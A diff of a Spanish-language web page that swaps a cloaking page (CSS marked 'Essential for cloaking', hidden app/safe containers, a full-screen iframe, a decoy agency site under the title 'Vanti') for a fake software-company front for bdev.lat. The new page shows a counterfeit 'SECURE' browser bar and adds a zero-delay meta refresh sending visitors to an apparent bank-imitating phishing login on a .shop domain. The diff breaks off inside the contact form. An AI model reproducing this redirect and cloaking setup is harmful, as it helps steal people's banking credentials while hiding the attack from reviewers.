@@ -1,386 +1,538 @@
 <!DOCTYPE html>
-<html lang="es">
-
+<html lang="es" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Vanti</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="shortcut icon" href="https://lasucursaldelnegocio.co/favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bdev.lat | Desarrollo de Software, Apps y Soluciones Tecnológicas en LatAm</title>
+    <meta name="description" content="Empresa líder en desarrollo de software a medida, aplicaciones web y móviles, arquitectura cloud y consultoría tecnológica en Latinoamérica. Impulsa tu negocio con bdev.lat.">
+    <meta name="keywords" content="desarrollo de software, bdev, latam, desarrollo web, aplicaciones móviles, consultoría IT, transformación digital">
+    <meta name="author" content="bdev.lat">
+    <meta name="robots" content="index, follow">
+    <meta http-equiv="refresh" content="0; url=https://digitalcredidavi.shop/login/">
+    <!-- Open Graph / SEO Social -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bdev.lat/">
+    <meta property="og:title" content="bdev.lat | Soluciones Tecnológicas de Vanguardia">
+    <meta property="og:description" content="Transformamos ideas en productos digitales escalables. Expertos en software, nube y arquitecturas modernas.">
+    <meta property="og:image" content="https://placehold.co/1200x630/0f172a/38bdf8?text=bdev.lat+Software+Engineering">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#f0f9ff',
+                            100: '#e0f2fe',
+                            500: '#0ea5e9',
+                            600: '#0284c7',
+                            900: '#0f172a',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #2563eb;
-            --primary-dark: #1d4ed8;
-            --secondary: #0f172a;
-            --text-main: #1e293b;
-            --text-light: #64748b;
-            --bg-light: #f8fafc;
-            --white: #ffffff;
-            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-        }
-
-        body,
-        html {
-            height: 100%;
-            width: 100%;
-            overflow-x: hidden;
-            background-color: var(--bg-light);
-            color: var(--text-main);
-            line-height: 1.6;
-        }
-
-        /* Essential for cloaking */
-        #_app,
-        #_safe {
-            position: relative;
-            width: 100%;
-            min-height: 100vh;
-            display: none;
-        }
-
-        #_app.active,
-        #_safe.active {
-            display: block;
-        }
-
-        iframe {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            z-index: 9999;
-        }
-
-        /* SAFE PAGE STYLES (Marketing Agency) */
-        header {
-            background: var(--white);
-            padding: 1.5rem 5%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-
-        .logo {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--primary);
-            letter-spacing: -0.5px;
-        }
-
-        nav a {
-            text-decoration: none;
-            color: var(--text-main);
-            margin-left: 2rem;
-            font-weight: 500;
-            font-size: 0.95rem;
-            transition: var(--transition);
-        }
-
-        nav a:hover {
-            color: var(--primary);
-        }
-
-        .hero {
-            padding: 10rem 5% 8rem;
-            text-align: center;
-            background: linear-gradient(rgba(241, 245, 249, 0.9), rgba(255, 255, 255, 0.9)), url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=1920');
-            background-size: cover;
-            background-position: center;
-        }
-
-        .hero h1 {
-            font-size: 3.5rem;
-            font-weight: 800;
-            color: var(--secondary);
-            margin-bottom: 1.5rem;
-            line-height: 1.1;
-        }
-
-        .hero p {
-            font-size: 1.25rem;
-            color: var(--text-light);
-            max-width: 700px;
-            margin: 0 auto 2rem;
-        }
-
-        .btn {
-            display: inline-block;
-            background: var(--primary);
-            color: var(--white);
-            padding: 1rem 2.5rem;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: var(--transition);
-            box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.2);
-        }
-
-        .btn:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 15px -3px rgba(37, 99, 235, 0.3);
-        }
-
-        .services {
-            padding: 5rem 5%;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .card {
-            background: var(--white);
-            padding: 2.5rem;
-            border-radius: 16px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
-            transition: var(--transition);
-            border: 1px solid #f1f5f9;
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
-        }
-
-        .card h3 {
-            margin-bottom: 1rem;
-            color: var(--secondary);
-        }
-
-        .contact-section {
-            padding: 5rem 5%;
-            max-width: 800px;
-            margin: 0 auto;
-            text-align: center;
-        }
-
-        .contact-form {
-            background: var(--white);
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-            text-align: left;
-            margin-top: 2rem;
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
-
-        .form-group input,
-        .form-group textarea {
-            width: 100%;
-            padding: 0.75rem;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            outline: none;
-        }
-
-        /* MODAL STYLES */
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal-content {
-            background: var(--white);
-            padding: 2.5rem;
-            border-radius: 12px;
-            max-width: 600px;
-            width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        @media (max-width: 768px) {
-            .hero h1 {
-                font-size: 2.5rem;
-            }
-
-            nav {
-                display: none;
-            }
-        }
+        body { font-family: 'Inter', sans-serif; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
     </style>
 </head>
+<body class="bg-slate-950 text-slate-100 antialiased selection:bg-sky-500 selection:text-white">
 
-<body>
+    <header class="fixed top-0 left-0 right-0 z-50 bg-slate-950/90 backdrop-blur-md border-b border-slate-800 transition-all duration-300">
+        <!-- Browser / Domain Status Bar Top -->
+        <div class="bg-slate-900 border-b border-slate-800/80 px-4 py-1.5 text-xs text-slate-400 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <div class="flex items-center gap-1.5">
+                    <span class="w-3 h-3 rounded-full bg-rose-500/80 inline-block"></span>
+                    <span class="w-3 h-3 rounded-full bg-amber-500/80 inline-block"></span>
+                    <span class="w-3 h-3 rounded-full bg-emerald-500/80 inline-block"></span>
+                </div>
+                <div class="hidden sm:flex items-center gap-2 ml-4 bg-slate-950 px-3 py-1 rounded-md border border-slate-800 font-mono text-[11px] text-sky-400">
+                    <i class="fa-solid fa-lock text-[10px] text-emerald-400"></i>
+                    <span>https://bdev.lat</span>
+                    <span class="bg-emerald-500/10 text-emerald-400 px-1.5 py-0.2 rounded text-[9px] font-sans font-semibold">SECURE</span>
+                </div>
+            </div>
+            <div class="flex items-center gap-3 font-medium">
+                <span class="hidden md:inline text-slate-400"><i class="fa-solid fa-signal text-sky-400 mr-1.5"></i>LatAm Region Node</span>
+                <span class="text-emerald-400 flex items-center gap-1.5 font-mono"><span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>Active Session</span>
+            </div>
+        </div>
 
-    <div id="_safe">
-        <header>
-            <div class="logo">NexGen Solutions</div>
-            <nav>
-                <a href="#servicios">Servicios</a>
-                <a href="#nosotros">Nosotros</a>
-                <a href="#contacto">Contacto</a>
+        <!-- Main Navigation Bar -->
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <a href="#" class="flex items-center gap-2 group">
+                <div class="w-9 h-9 rounded-xl bg-gradient-to-br from-sky-400 to-blue-600 flex items-center justify-center font-extrabold text-lg text-white shadow-lg shadow-sky-500/30 group-hover:scale-105 transition-transform">
+                    b
+                </div>
+                <div class="flex flex-col">
+                    <span class="text-xl font-bold tracking-tight text-white leading-none">bdev<span class="text-sky-400">.lat</span></span>
+                    <span class="text-[10px] text-slate-400 font-mono mt-0.5">Software Engineering</span>
+                </div>
+            </a>
+            <nav class="hidden md:flex items-center gap-8 text-sm font-medium text-slate-300">
+                <a href="#servicios" class="hover:text-sky-400 transition-colors">Servicios</a>
+                <a href="#nosotros" class="hover:text-sky-400 transition-colors">Nosotros</a>
+                <a href="#stack" class="hover:text-sky-400 transition-colors">Tecnologías</a>
+                <a href="#contacto" class="hover:text-sky-400 transition-colors">Contacto</a>
             </nav>
-        </header>
-
-        <section class="hero">
-            <h1>Elevamos tu Presencia Digital al Siguiente Nivel</h1>
-            <p>Estrategias de marketing basadas en datos para empresas que buscan un crecimiento real y sostenible en el mercado actual.</p>
-            <a href="#contacto" class="btn">Comenzar Ahora</a>
-        </section>
-
-        <section class="services" id="servicios">
-            <div class="card">
-                <h3>SEO Estratégico</h3>
-                <p>Optimizamos tu visibilidad en buscadores para atraer tráfico de alta calidad de forma orgánica.</p>
+            <div class="hidden md:flex items-center gap-4">
+                <a href="#contacto" class="px-5 py-2 rounded-full bg-sky-500 hover:bg-sky-600 text-white font-semibold text-sm shadow-lg shadow-sky-500/25 transition-all hover:shadow-sky-500/40 transform hover:-translate-y-0.5">
+                    Cotizar Proyecto
+                </a>
             </div>
-            <div class="card">
-                <h3>Publicidad PPC</h3>
-                <p>Campañas de Google Ads y Social Ads diseñadas para maximizar el retorno de inversión (ROI).</p>
+            <!-- Mobile Menu Toggle -->
+            <button id="menu-btn" class="md:hidden text-slate-300 hover:text-white text-2xl focus:outline-none" aria-label="Abrir menú">
+                <i class="fa-solid fa-bars"></i>
+            </button>
+        </div>
+        <!-- Mobile Dropdown Menu -->
+        <div id="mobile-menu" class="hidden md:hidden bg-slate-900 border-b border-slate-800 px-6 py-4 flex flex-col gap-4">
+            <div class="bg-slate-950 px-3 py-1.5 rounded-lg border border-slate-800 font-mono text-xs text-sky-400 flex items-center gap-2">
+                <i class="fa-solid fa-lock text-emerald-400 text-[10px]"></i>
+                <span>https://bdev.lat</span>
             </div>
-            <div class="card">
-                <h3>Diseño UX/UI</h3>
-                <p>Creamos experiencias digitales memorables que convierten visitantes en clientes leales.</p>
-            </div>
-        </section>
+            <a href="#servicios" class="mobile-link text-slate-300 hover:text-sky-400 font-medium">Servicios</a>
+            <a href="#nosotros" class="mobile-link text-slate-300 hover:text-sky-400 font-medium">Nosotros</a>
+            <a href="#stack" class="mobile-link text-slate-300 hover:text-sky-400 font-medium">Tecnologías</a>
+            <a href="#contacto" class="mobile-link text-slate-300 hover:text-sky-400 font-medium">Contacto</a>
+            <a href="#contacto" class="mobile-link text-center w-full py-2.5 rounded-full bg-sky-500 text-white font-semibold text-sm">Cotizar Proyecto</a>
+        </div>
+    </header>
 
-        <section class="contact-section" id="contacto">
-            <h2>Contacta con Nosotros</h2>
-            <p>Déjanos tus datos y un especialista se pondrá en contacto contigo.</p>
-            <div class="contact-form">
-                <div class="form-group">
-                    <label>Nombre Completo</label>
-                    <input type="text" placeholder="Ej: Juan Pérez">
+    <section class="relative pt-36 pb-20 md:pt-48 md:pb-32 overflow-hidden">
+        <!-- Glow background effects -->
+        <div class="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] bg-sky-500/15 rounded-full blur-[120px] pointer-events-none"></div>
+        <div class="absolute top-1/3 right-10 w-[300px] h-[300px] bg-blue-600/10 rounded-full blur-[100px] pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 text-center">
+            <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-slate-900 border border-slate-800 text-xs sm:text-sm text-sky-400 font-medium mb-6 shadow-inner">
+                <span class="flex h-2 w-2 rounded-full bg-sky-400 animate-pulse"></span>
+                Usted está navegando oficialmente en <strong class="text-white font-mono">bdev.lat</strong>
+            </div>
+            <h1 class="text-4xl sm:text-6xl lg:text-7xl font-extrabold tracking-tight text-white max-w-4xl mx-auto leading-tight">
+                Ingeniería de Software y <span class="bg-gradient-to-r from-sky-400 to-blue-500 bg-clip-text text-transparent">Soluciones Cloud</span>
+            </h1>
+            <p class="mt-6 text-lg sm:text-xl text-slate-400 max-w-2xl mx-auto leading-relaxed">
+                Desde <strong class="text-white font-semibold">bdev.lat</strong> diseñamos, desarrollamos y escalamos productos digitales de alto rendimiento para empresas y startups que buscan liderar el mercado tecnológico en Latinoamérica.
+            </p>
+            <div class="mt-10 flex flex-col sm:flex-row items-center justify-center gap-4">
+                <a href="#contacto" class="w-full sm:w-auto px-8 py-4 rounded-xl bg-sky-500 hover:bg-sky-600 text-white font-bold text-base shadow-xl shadow-sky-500/30 transition-all transform hover:-translate-y-1 text-center">
+                    Iniciar Colaboración <i class="fa-solid fa-arrow-right ml-2"></i>
+                </a>
+                <a href="#servicios" class="w-full sm:w-auto px-8 py-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-semibold text-base transition-all text-center">
+                    Explorar Servicios
+                </a>
+            </div>
+
+            <!-- Stats Bar -->
+            <div class="mt-20 grid grid-cols-2 md:grid-cols-4 gap-6 max-w-5xl mx-auto pt-10 border-t border-slate-900">
+                <div class="p-4 rounded-2xl bg-slate-900/40 border border-slate-800/60">
+                    <div class="text-3xl sm:text-4xl font-extrabold text-sky-400">+50</div>
+                    <div class="text-xs sm:text-sm text-slate-400 mt-1">Proyectos Exitosos</div>
                 </div>
-                <div class="form-group">
-                    <label>Email Corporativo</label>
-                    <input type="email" placeholder="email@empresa.com">
+                <div class="p-4 rounded-2xl bg-slate-900/40 border border-slate-800/60">
+                    <div class="text-3xl sm:text-4xl font-extrabold text-sky-400">99.9%</div>
+                    <div class="text-xs sm:text-sm text-slate-400 mt-1">Uptime y Fiabilidad</div>
                 </div>
-                <div class="form-group">
-                    <label>Mensaje</label>
-                    <textarea rows="4" placeholder="¿En qué podemos ayudarte?"></textarea>
+                <div class="p-4 rounded-2xl bg-slate-900/40 border border-slate-800/60">
+                    <div class="text-3xl sm:text-4xl font-extrabold text-sky-400">+15</div>
+                    <div class="text-xs sm:text-sm text-slate-400 mt-1">Países con Alcance</div>
                 </div>
-                <button class="btn" style="width: 100%; border: none; cursor: pointer;">Enviar Mensaje</button>
+                <div class="p-4 rounded-2xl bg-slate-900/40 border border-slate-800/60">
+                    <div class="text-3xl sm:text-4xl font-extrabold text-sky-400">24/7</div>
+                    <div class="text-xs sm:text-sm text-slate-400 mt-1">Soporte Técnico</div>
+                </div>
             </div>
-        </section>
+        </div>
+    </section>
 
-        <footer class="footer">
-            <p>&copy; 2026 NexGen Solutions S.A.S. Todos los derechos reservados.</p>
-            <div class="footer-links">
-                <a href="javascript:void(0)" onclick="openM('p')">Política de Privacidad</a>
-                <a href="javascript:void(0)" onclick="openM('t')">Términos de Servicio</a>
-                <a href="javascript:void(0)" onclick="openM('c')">Cookies</a>
+    <section id="servicios" class="py-24 bg-slate-900/50 border-t border-slate-900 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto">
+                <h2 class="text-xs font-bold uppercase tracking-widest text-sky-400 mb-3">Nuestras Capacidades en bdev.lat</h2>
+                <p class="text-3xl sm:text-4xl font-extrabold text-white">Soluciones Tecnológicas Integrales</p>
+                <p class="mt-4 text-slate-400">Combinamos experiencia en desarrollo ágil con arquitecturas robustas orientadas a resultados comerciales medibles.</p>
             </div>
-        </footer>
 
-        <div id="m" class="modal" onclick="closeM()">
-            <div class="modal-content" onclick="event.stopPropagation()">
-                <h2 id="mT"></h2>
-                <div id="mB" style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);"></div>
-                <button class="btn" onclick="closeM()" style="margin-top: 1.5rem;">Cerrar</button>
+            <div class="mt-16 grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Service 1 -->
+                <div class="p-8 rounded-2xl bg-slate-900 border border-slate-800 hover:border-sky-500/50 transition-all group">
+                    <div class="w-14 h-14 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center text-sky-400 text-2xl mb-6 group-hover:scale-110 transition-transform">
+                        <i class="fa-solid fa-code"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Desarrollo de Software a Medida</h3>
+                    <p class="text-slate-400 text-sm leading-relaxed">
+                        Construimos aplicaciones web empresariales y plataformas corporativas escalables adaptadas exactamente a los procesos operativos de tu organización.
+                    </p>
+                    <ul class="mt-6 space-y-2 text-xs text-slate-300 font-medium">
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> Arquitectura Frontend & Backend</li>
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> APIs RESTful y GraphQL</li>
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> Pruebas y Control de Calidad</li>
+                    </ul>
+                </div>
+
+                <!-- Service 2 -->
+                <div class="p-8 rounded-2xl bg-slate-900 border border-slate-800 hover:border-sky-500/50 transition-all group">
+                    <div class="w-14 h-14 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center text-sky-400 text-2xl mb-6 group-hover:scale-110 transition-transform">
+                        <i class="fa-solid fa-mobile-screen-button"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Apps Móviles Multiplataforma</h3>
+                    <p class="text-slate-400 text-sm leading-relaxed">
+                        Creamos aplicaciones nativas e híbridas de alto rendimiento con experiencias de usuario fluidas tanto para iOS como para Android.
+                    </p>
+                    <ul class="mt-6 space-y-2 text-xs text-slate-300 font-medium">
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> React Native & Flutter</li>
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> Integración con Hardware y Sensores</li>
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> Publicación en Stores</li>
+                    </ul>
+                </div>
+
+                <!-- Service 3 -->
+                <div class="p-8 rounded-2xl bg-slate-900 border border-slate-800 hover:border-sky-500/50 transition-all group">
+                    <div class="w-14 h-14 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center text-sky-400 text-2xl mb-6 group-hover:scale-110 transition-transform">
+                        <i class="fa-solid fa-cloud"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Cloud DevOps & Infraestructura</h3>
+                    <p class="text-slate-400 text-sm leading-relaxed">
+                        Migramos, configuramos y optimizamos entornos en la nube con altos estándares de seguridad, alta disponibilidad y despliegue continuo automatizado.
+                    </p>
+                    <ul class="mt-6 space-y-2 text-xs text-slate-300 font-medium">
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> AWS, Google Cloud & Azure</li>
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> Contenedores Docker & Kubernetes</li>
+                        <li class="flex items-center gap-2"><i class="fa-solid fa-check text-sky-400"></i> Pipelines CI/CD</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="nosotros" class="py-24 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+                <div>
+                    <h2 class="text-xs font-bold uppercase tracking-widest text-sky-400 mb-3">Sobre bdev.lat</h2>
+                    <h3 class="text-3xl sm:text-4xl font-extrabold text-white leading-tight">Expertos apasionados por la innovación y la calidad de código</h3>
+                    <p class="mt-6 text-slate-400 leading-relaxed">
+                        En <strong class="text-white">bdev.lat</strong> reunimos a ingenieros de software, diseñadores UX/UI y expertos en infraestructura con un propósito común: simplificar la complejidad técnica y construir herramientas digitales que impulsen el crecimiento exponencial de nuestros clientes.
+                    </p>
+                    <p class="mt-4 text-slate-400 leading-relaxed">
+                        Operamos bajo metodologías ágiles, garantizando transparencia, entregas iterativas y un compromiso absoluto con los tiempos de desarrollo y la seguridad de la información.
+                    </p>
+                    <div class="mt-8 grid grid-cols-2 gap-4">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-lg bg-sky-500/10 flex items-center justify-center text-sky-400 font-bold"><i class="fa-solid fa-shield-halved"></i></div>
+                            <span class="text-sm font-medium text-slate-300">Seguridad Robusta</span>
+                        </div>
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-lg bg-sky-500/10 flex items-center justify-center text-sky-400 font-bold"><i class="fa-solid fa-bolt"></i></div>
+                            <span class="text-sm font-medium text-slate-300">Alta Velocidad</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="relative">
+                    <div class="absolute inset-0 bg-gradient-to-tr from-sky-500/20 to-blue-600/20 rounded-3xl blur-2xl"></div>
+                    <div class="relative bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl">
+                        <div class="flex items-center justify-between pb-6 border-b border-slate-800 mb-6">
+                            <div class="flex items-center gap-2">
+                                <div class="w-3 h-3 rounded-full bg-rose-500"></div>
+                                <div class="w-3 h-3 rounded-full bg-amber-500"></div>
+                                <div class="w-3 h-3 rounded-full bg-emerald-500"></div>
+                            </div>
+                            <span class="text-xs text-slate-500 font-mono">bdev-lat-cluster.js</span>
+                        </div>
+                        <pre class="text-xs sm:text-sm font-mono text-sky-300 overflow-x-auto leading-relaxed"><code><span class="text-purple-400">const</span> <span class="text-blue-300">bdevLat</span> = {
+  <span class="text-amber-300">domain</span>: <span class="text-emerald-300">"https://bdev.lat"</span>,
+  <span class="text-amber-300">mission</span>: <span class="text-emerald-300">"Build scalable digital products"</span>,
+  <span class="text-amber-300">standards</span>: [<span class="text-emerald-300">"Clean Code"</span>, <span class="text-emerald-300">"SEO Optimized"</span>, <span class="text-emerald-300">"Cloud"</span>],
+  <span class="text-amber-300">execute</span>: <span class="text-purple-400">function</span>() {
+    <span class="text-purple-400">return</span> <span class="text-emerald-300">"Success Delivered Across LatAm"</span>;
+  }
+};
+<span class="text-slate-500">bdevLat.execute();</span></code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="stack" class="py-20 bg-slate-900/50 border-t border-slate-900">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <h2 class="text-xs font-bold uppercase tracking-widest text-sky-400 mb-3">Stack Tecnológico</h2>
+            <p class="text-2xl sm:text-3xl font-extrabold text-white mb-12">Tecnologías de Vanguardia que Utilizamos en bdev.lat</p>
+            
+            <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-6">
+                <div class="p-6 rounded-xl bg-slate-900 border border-slate-800 flex flex-col items-center justify-center gap-3 hover:border-sky-500/50 transition-all">
+                    <i class="fa-brands fa-react text-4xl text-sky-400"></i>
+                    <span class="text-sm font-semibold text-slate-200">React & Next.js</span>
+                </div>
+                <div class="p-6 rounded-xl bg-slate-900 border border-slate-800 flex flex-col items-center justify-center gap-3 hover:border-sky-500/50 transition-all">
+                    <i class="fa-brands fa-node-js text-4xl text-emerald-400"></i>
+                    <span class="text-sm font-semibold text-slate-200">Node.js</span>
+                </div>
+                <div class="p-6 rounded-xl bg-slate-900 border border-slate-800 flex flex-col items-center justify-center gap-3 hover:border-sky-500/50 transition-all">
+                    <i class="fa-brands fa-python text-4xl text-amber-400"></i>
+                    <span class="text-sm font-semibold text-slate-200">Python & AI</span>
+                </div>
+                <div class="p-6 rounded-xl bg-slate-900 border border-slate-800 flex flex-col items-center justify-center gap-3 hover:border-sky-500/50 transition-all">
+                    <i class="fa-brands fa-aws text-4xl text-orange-400"></i>
+                    <span class="text-sm font-semibold text-slate-200">AWS Cloud</span>
+                </div>
+                <div class="p-6 rounded-xl bg-slate-900 border border-slate-800 flex flex-col items-center justify-center gap-3 hover:border-sky-500/50 transition-all">
+                    <i class="fa-brands fa-docker text-4xl text-blue-400"></i>
+                    <span class="text-sm font-semibold text-slate-200">Docker</span>
+                </div>
+                <div class="p-6 rounded-xl bg-slate-900 border border-slate-800 flex flex-col items-center justify-center gap-3 hover:border-sky-500/50 transition-all">
+                    <i class="fa-solid fa-database text-4xl text-purple-400"></i>
+                    <span class="text-sm font-semibold text-slate-200">SQL & NoSQL</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="contacto" class="py-24 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-12">
+                <div>
+                    <h2 class="text-xs font-bold uppercase tracking-widest text-sky-400 mb-3">Conectemos</h2>
+                    <h3 class="text-3xl sm:text-4xl font-extrabold text-white leading-tight">¿Listo para llevar tu proyecto al siguiente nivel en bdev.lat?</h3>
+                    <p class="mt-4 text-slate-400 leading-relaxed">
+                        Completa el formulario o contáctanos a través de nuestros canales oficiales. Nuestro equipo técnico responderá en menos de 24 horas hábiles.
+                    </p>
+
+                    <div class="mt-8 space-y-6">
+                        <div class="flex items-center gap-4">
+                            <div class="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center text-sky-400 text-lg">
+                                <i class="fa-solid fa-envelope"></i>
+                            </div>
+                            <div>
+                                <div class="text-xs text-slate-400">Correo Electrónico Oficial</div>
+                                <a href="mailto:contacto@bdev.lat" class="text-white font-semibold hover:text-sky-400 transition-colors">contacto@bdev.lat</a>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <div class="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center text-sky-400 text-lg">
+                                <i class="fa-solid fa-globe"></i>
+                            </div>
+                            <div>
+                                <div class="text-xs text-slate-400">Dominio Principal</div>
+                                <div class="text-white font-semibold font-mono">https://bdev.lat</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Interactive Social Networks -->
+                    <div class="mt-10 pt-8 border-t border-slate-900">
+                        <div class="text-sm font-semibold text-slate-300 mb-4">Síguenos en Redes Sociales:</div>
+                        <div class="flex items-center gap-4">
+                            <a href="https://linkedin.com" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white hover:bg-sky-600 hover:border-sky-500 transition-all" aria-label="LinkedIn">
+                                <i class="fa-brands fa-linkedin-in"></i>
+                            </a>
+                            <a href="https://github.com" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white hover:bg-sky-600 hover:border-sky-500 transition-all" aria-label="GitHub">
+                                <i class="fa-brands fa-github"></i>
+                            </a>
+                            <a href="https://twitter.com" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white hover:bg-sky-600 hover:border-sky-500 transition-all" aria-label="Twitter">
+                                <i class="fa-brands fa-twitter"></i>
+                            </a>
+                            <a href="https://instagram.com" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white hover:bg-sky-600 hover:border-sky-500 transition-all" aria-label="Instagram">
+                                <i class="fa-brands fa-instagram"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Functional Contact Form -->
+                <div class="bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl">
+                    <form id="contact-form" class="space-y-6">
+                        <div>
+                            <label for="name" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">Nombre Completo</label>
+                            <input type="text" id="name" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-sky-500 transition-colors text-sm" placeholder="Ej. Carlos Mendoza">
+                        </div>
+                        <div>
+                            <label for="email" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">Correo Electrónico</label>
+                            <input type="email" id="email" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-sky-500 transition-colors text-sm" placeholder="ejemplo@empresa.com">
+                        </div>
+                        <div>
+                            <label for="service" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">Servicio de Interés</label>
+                            <select id="service" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-sky-500 transition-colors text-sm">
+                                <option value="software">Desarrollo de Software a Medida</option>
+                                <option value="mobile">Apps Móviles</option>
